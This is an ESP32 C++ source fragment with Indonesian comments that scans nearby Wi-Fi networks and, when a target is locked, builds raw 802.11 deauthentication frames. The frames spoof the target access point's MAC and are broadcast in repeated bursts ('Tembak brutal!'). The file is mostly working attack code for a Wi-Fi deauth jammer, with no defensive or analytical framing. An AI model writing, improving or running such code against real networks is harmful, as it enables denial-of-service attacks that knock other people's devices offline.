#include "esp_wifi.h"

// Fungsi sakti buat ubah String MAC ke Bytes
void stringToMac(String macStr, uint8_t *macAddr) {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

// Paket Deauth Mentah
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Target)
    0x00, 0x00, 0x01, 0x00              
};


void loopWiFi(void * pvParameters) {
  for(;;) {
    if (triggerScan) {
      sedang_scan = true;
      
       adaTarget = false;        // Target lama dihapus
      targetLockedIdx = -1;     // Indeks kursor di-reset
      
      // Bersihin data lama dulu biar fresh
      totalWiFi = 0;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      vTaskDelay(100 / portTICK_PERIOD_MS);

      // Mulai Scan (Ini biasanya makan waktu 3-5 detik secara alami)
      int n = WiFi.scanNetworks();
      
      totalWiFi = (n > 30) ? 30 : n; // Maksimal 30 biar RAM lega
      for (int i = 0; i < totalWiFi; ++i) {
        listWiFi[i].id = i;
        listWiFi[i].ssid = WiFi.SSID(i);
        listWiFi[i].rssi = WiFi.RSSI(i);
        listWiFi[i].channel = WiFi.channel(i);
      }
      
      sedang_scan = false;
      scanDone = true;     // Lapor ke Core 1 kalau udah beres
      triggerScan = false; // Matiin pelatuknya
    } else if (isDeauthing && adaTarget) {
      uint8_t targetMac[6];
      stringToMac(targetTerkunci.mac, targetMac);
      
      // Copy MAC ke paket (Source & BSSID)
      memcpy(&deauthPacket[10], targetMac, 6);
      memcpy(&deauthPacket[16], targetMac, 6);
      
      esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
      
      // Tembak brutal!
      for(int i=0; i<10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        vTaskDelay(2 / portTICK_PERIOD_MS); 
      }
    }
    
     // Core 0 istirahat 50ms biar gak overheat sambil nunggu perintah
    vTaskDelay(50 / portTICK_PERIOD_MS); 
  }
}
